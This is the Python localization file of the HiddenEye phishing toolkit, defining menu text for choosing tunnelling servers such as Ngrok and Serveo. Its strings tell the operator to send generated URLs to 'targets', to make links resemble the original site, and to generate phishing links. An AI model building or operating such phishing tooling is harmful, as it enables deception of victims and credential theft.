#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import Defs.ThemeManager.theme as theme
from Defs.LocalizationManager.localization import _

default_palette = theme.default_palette

lang_server_selection = {
    "server_selection": _(
        "{0}[ HOSTING SERVER SELECTION ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "select_any_available_server": _(
        "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}"
    ).format(default_palette[0], default_palette[4]),
    "servers_list": [
        ["{0}[{1}00{0}]{1}Localhost", "{0}[{1}04{0}]{1}Localtunnel (not working now)"],
        ["{0}[{1}01{0}]{1}Ngrok", "{0}[{1}05{0}]{1}OpenPort (not working now)"],
        ["{0}[{1}02{0}]{1}Serveo", "{0}[{1}06{0}]{1}Pagekite (not working now)"],
        ["{0}[{1}03{0}]{1}Localxpose (not working now)"],
    ],
}

lang_start_localhost = {
    "localhost_server": _(
        "\n{0}[ LOCALHOST SERVER ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "your_localhost_is": _("Your Localhost is "),
    "starting_server_on_addr": _("\n[*] Starting Server On Address:: {0}:{1}"),
    "running_localhost_server": _(
        "\n{0}[ RUNNING LOCALHOST SERVER ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion": _(
        "\n{0}[{1}!{0}]{1} SEND THIS URL TO TARGETS ON SAME NETWORK"
    ).format(default_palette[0], default_palette[2]),
    "localhost_url": _("\n{0}[{1}*{0}]{1} Localhost URL: {2}http://").format(
        default_palette[2], default_palette[3], default_palette[3]
    ),
}

lang_start_ngrok = {
    "ngrok_server": _(
        "\n{0}[ NGROK SERVER ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion": _(
        "\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO TARGETS"
    ).format(default_palette[0], default_palette[2]),
    "ngrok_url": _("\n{0}[{1}*{0}]{1} NGROK URL: {2}").format(
        default_palette[0], default_palette[2], default_palette[3]
    ),
}

lang_start_serveo = {
    "serveo_random_server": _(
        "\n{0}[ RANDOM SERVEO URL ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "serveo_custom_server": _(
        "\n{0}[ CUSTOM SERVEO URL ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "send_this_url_suggestion": _(
        "\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO TARGETS"
    ).format(default_palette[0], default_palette[4]),
    "make_url_simmilar_to_real_suggestion": _(
        "\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO ORIGINAL."
    ).format(default_palette[0], default_palette[4]),
    "insert_custom_subdomain": _("\n{0}Insert a custom subdomain for serveo").format(
        default_palette[0], default_palette[2]
    ),
    "serveo_url": _("\n{0}[{1}*{0}]{1} SERVEO URL: {2}").format(
        default_palette[0], default_palette[4], default_palette[3]
    ),
    "failed_to_get_domain": _("\n{0}FAILED TO GET THIS DOMAIN.").format(
        default_palette[0]
    ),
    "suggestion_to_fix_issue": _(
        "\n{0}CUSTOM URL MAY BE NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE."
    ).format(default_palette[0]),
    "you_can_try_to_select_other_domain": _(
        "\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK)..."
    ).format(default_palette[0], default_palette[4]),
    "serveo_url_option_selection": _(
        "\n{0}[ SERVEO URL TYPE SELECTION ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2]),
    "serveo_phishing_warning": _(
        "\n{0}[{1}!{0}]{1}Serveo Drops The Connection Whenever Detects Phishing. Be careful."
    ).format(default_palette[0], default_palette[2]),
    "choose_type_of_url": _(
        "\n{0}[{1}*{0}]{0}CHOOSE SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}"
    ).format(default_palette[0], default_palette[2]),
    "url_types": [
        ["{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url)"],
        ["{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)"],
    ],
    "serveo_is_down": _(
        "{0}[{1}1{0}]Serveo is {1}DOWN{0} now, do you want to select another option? {1}Y{0}/{1}n{0}"
    ).format(default_palette[0], default_palette[2]),
}

lang_start_localxpose = {
    "localxpose_random_server": _(
        "\n{0}[ RANDOM LOCALXPOSE URL ]{1}! {0}\n-------------------------------"
    ).format(default_palette[0], default_palette[2])
}
